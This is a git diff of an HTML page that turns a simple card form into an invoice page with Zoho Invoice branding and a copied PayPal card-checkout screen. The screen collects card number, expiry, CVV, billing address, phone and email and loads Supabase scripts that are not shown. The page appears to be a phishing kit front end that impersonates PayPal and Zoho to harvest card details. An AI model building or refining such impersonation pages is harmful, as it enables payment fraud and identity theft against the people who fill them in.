@@ -1,59 +1,195 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Payment</title>
+  <title>Payment Portal</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link
-    href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap"
-    rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="styles.css">
 </head>
-
 <body>
-  <main class="page-shell">
-    <section class="checkout-frame reveal">
-      <form id="payment-form" class="payment-form">
-        <h1 class="sr-only">Payment form</h1>
+  <!-- INVOICE VIEW -->
+  <main id="invoice-view" class="view reveal">
+    <div class="invoice-top-bg"></div>
+    <div class="invoice-content">
 
-        <label class="field">
-          <span>Name on card</span>
-          <input id="card-name" class="shadcn-input" name="cardName" type="text" autocomplete="cc-name"
-            placeholder="Caulbaugh Andrew" required>
-        </label>
+      <div class="shop-banner" style="padding-top: 40px;">
+        <div class="shop-logo" id="display-shop-logo">
+          <img src="companylogo.png" alt="Company Logo" style="width:100%;height:100%;object-fit:cover;border-radius:12px;">
+        </div>
+        <div class="shop-details">
+          <h2 id="banner-shop-name">WESTERN BOUTIQUE</h2>
+          <p id="banner-shop-loc">U.S.A</p>
+        </div>
+      </div>
 
-        <label class="field">
-          <span>Card number</span>
-          <input id="card-number" class="shadcn-input" name="cardNumber" type="text" inputmode="numeric"
-            autocomplete="cc-number" maxlength="19" placeholder="4084 0840 8408 4081" required>
-        </label>
+      <div class="payment-modes-card" style="margin-top: 24px;">
+        <h3 class="pm-title">Payment Modes</h3>
+        <ul class="pm-list">
+          <li class="pm-item" id="btn-paypal">
+            <div class="pm-left">
+              <div class="pm-icon-wrap" style="background: #fff; border: 1px solid #e2e8f0; display: flex; align-items: center; justify-content: center;">
+                <img src="justthepaypallogopp.png" alt="PayPal" style="height: 18px; object-fit: contain;">
+              </div>
+              <span class="pm-name">PayPal</span>
+            </div>
+            <span class="pm-arrow">&rsaquo;</span>
+          </li>
+          <li class="pm-item" id="btn-venmo">
+            <div class="pm-left">
+              <div class="pm-icon-wrap" style="background: #3396ff; display: flex; align-items: center; justify-content: center;">
+                <img src="icons8-venmo-100.png" alt="Venmo" style="height: 20px; object-fit: contain;">
+              </div>
+              <span class="pm-name">Venmo</span>
+            </div>
+            <span class="pm-arrow">&rsaquo;</span>
+          </li>
+        </ul>
+      </div>
 
-        <div class="field-grid field-grid--two">
-          <label class="field">
-            <span>Expiry date</span>
-            <input id="expiry" class="shadcn-input" name="expiry" type="text" inputmode="numeric"
-              autocomplete="cc-exp" maxlength="5" placeholder="04/28">
-          </label>
+      <footer class="invoice-footer">
+        <p>Secure payments, powered by <span class="zoho-logo"><svg width="12" height="12" viewBox="0 0 24 24" fill="#0056b3"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path></svg> Zoho <strong>Invoice</strong></span></p>
+        <p>Create truly professional invoices by visiting <a href="#">zoho.com/invoice</a></p>
+      </footer>
+    </div>
+  </main>
 
-          <label class="field">
-            <span>CVV</span>
-            <input id="cvv" class="shadcn-input" name="cvv" type="password" inputmode="numeric"
-              autocomplete="cc-csc" maxlength="4" placeholder="123">
-          </label>
+  <!-- PAYPAL VIEW -->
+  <main id="paypal-view" class="view" style="display: none;">
+    <div class="paypal-container">
+      <div class="paypal-left">
+        
+        <div class="paypal-top-actions" style="margin-bottom: 24px;">
+          <button type="button" id="btn-back-to-invoice" class="back-link" style="background:none;border:none;color:#0070ba;font-weight:600;cursor:pointer;padding:0;font-size:20px;">&larr;</button>
         </div>
 
-        <button id="pay-button" class="primary-action" type="submit">Pay</button>
-        <p id="form-status" class="form-status" aria-live="polite"></p>
-      </form>
-    </section>
+        <header class="paypal-header">
+          <img src="paypalnamefull.png" alt="PayPal" style="height: 26px; object-fit: contain;">
+          <div class="paypal-cart">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2"><path d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z"/></svg>
+            <span id="paypal-display-amount"></span>
+          </div>
+        </header>
+
+        <div class="paypal-lang">
+          <span class="lang-text">English</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+        </div>
+
+        <div class="paypal-form-header">
+          <h2>Pay With Debit or Credit Card</h2>
+          <p>We don't share your financial details with the merchant.</p>
+        </div>
+
+        <form id="payment-form" class="paypal-form">
+          
+          <div class="card-brands" style="display: flex; gap: 8px; align-items: center;">
+             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="20" alt="Mastercard"/>
+             <img src="justthepaypallogopp.png" height="15" alt="PayPal"/>
+             <img src="visa-3-svgrepo-com.svg" height="14" alt="Visa"/>
+             <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" height="20" alt="Amex"/>
+             <img src="icons8-discover-card-48.png" height="24" alt="Discover"/>
+          </div>
+
+          <div class="field">
+            <input id="card-name" class="shadcn-input" name="cardName" type="text" autocomplete="cc-name" placeholder="Name on card" required>
+          </div>
+
+          <div class="field card-field-wrap">
+            <input id="card-number" class="shadcn-input card-input" name="cardNumber" type="text" inputmode="numeric" autocomplete="cc-number" maxlength="19" placeholder="Card number" required>
+          </div>
+
+          <div class="field-grid field-grid--two">
+            <label class="field">
+              <input id="expiry" class="shadcn-input" name="expiry" type="text" inputmode="numeric" autocomplete="cc-exp" maxlength="5" placeholder="MM / YY" required>
+            </label>
+
+            <label class="field cvv-field">
+              <input id="cvv" class="shadcn-input" name="cvv" type="password" inputmode="numeric" autocomplete="cc-csc" maxlength="4" placeholder="CVV" required>
+              <svg class="cvv-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2" ry="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+            </label>
+          </div>
+
+          <h3 class="billing-heading">Billing Address</h3>
+          
+          <div class="billing-fields">
+            <div class="billing-row">
+              <label>First name</label>
+              <input id="first-name" class="shadcn-input" name="firstName" type="text" required>
+            </div>
+
+            <div class="billing-row">
+              <label>Last name</label>
+              <input id="last-name" class="shadcn-input" name="lastName" type="text" required>
+            </div>
+
+            <div class="billing-row">
+              <label>Country</label>
+              <select id="billing-country" class="shadcn-input" name="country" required>
+                <option value="" disabled selected>Select a Country</option>
+              </select>
+            </div>
+
+            <div class="billing-row align-start">
+              <label>Billing address</label>
+              <div class="input-stack">
+                <input id="street-address" class="shadcn-input" name="streetAddress" type="text" required>
+                <p class="hint-text">If your billing address is a PO Box, please enter the number first. Example: Box 123 would be entered as 123 PO Box.</p>
+                <input id="street-address-2" class="shadcn-input" name="streetAddress2" type="text" placeholder="Apt, Suite, Bldg (optional)">
+              </div>
+            </div>
+
+            <div class="billing-row">
+              <label>City</label>
+              <div class="input-stack" style="position: relative;">
+                <input id="city" class="shadcn-input" name="city" type="text" required autocomplete="off">
+                <div id="city-results" class="autocomplete-dropdown" style="display: none;"></div>
+              </div>
+            </div>
+
+            <div class="billing-row" id="state-row">
+              <label id="state-label">State</label>
+              <input id="state-input" class="shadcn-input" name="state" type="text" placeholder="" required>
+              <select id="state-select" class="shadcn-input" name="state" style="display: none;" disabled required>
+                <option value="" disabled selected>Select a State</option>
+              </select>
+            </div>
+
+            <div class="billing-row">
+              <label>ZIP</label>
+              <input id="zip-code" class="shadcn-input" name="zipCode" type="text" required>
+            </div>
+
+            <div class="billing-row">
+              <label>Phone Number</label>
+              <input id="phone-number" class="shadcn-input" name="phoneNumber" type="tel" required>
+            </div>
+
+            <div class="billing-row">
+              <label>Email Address</label>
+              <input id="email-address" class="shadcn-input" name="emailAddress" type="email" required>
+            </div>
+          </div>
+
+          <button id="pay-button" class="primary-action paypal-pay-btn" type="submit">Pay Now</button>
+          <p id="form-status" class="form-status" aria-live="polite"></p>
+        </form>
+      </div>
+
+      <div class="paypal-right">
+        <div class="paypal-shield">
+           <svg viewBox="0 0 24 24" fill="#0070ba" width="60" height="60"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        </div>
+        <h3>PayPal is a safer, faster<br>way to pay</h3>
+        <p>No matter where you shop with us, we<br>don't share your financial information with<br>the seller.</p>
+      </div>
+    </div>
   </main>
 
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="/config.js"></script>
   <script src="script.js"></script>
 </body>
-
 </html>
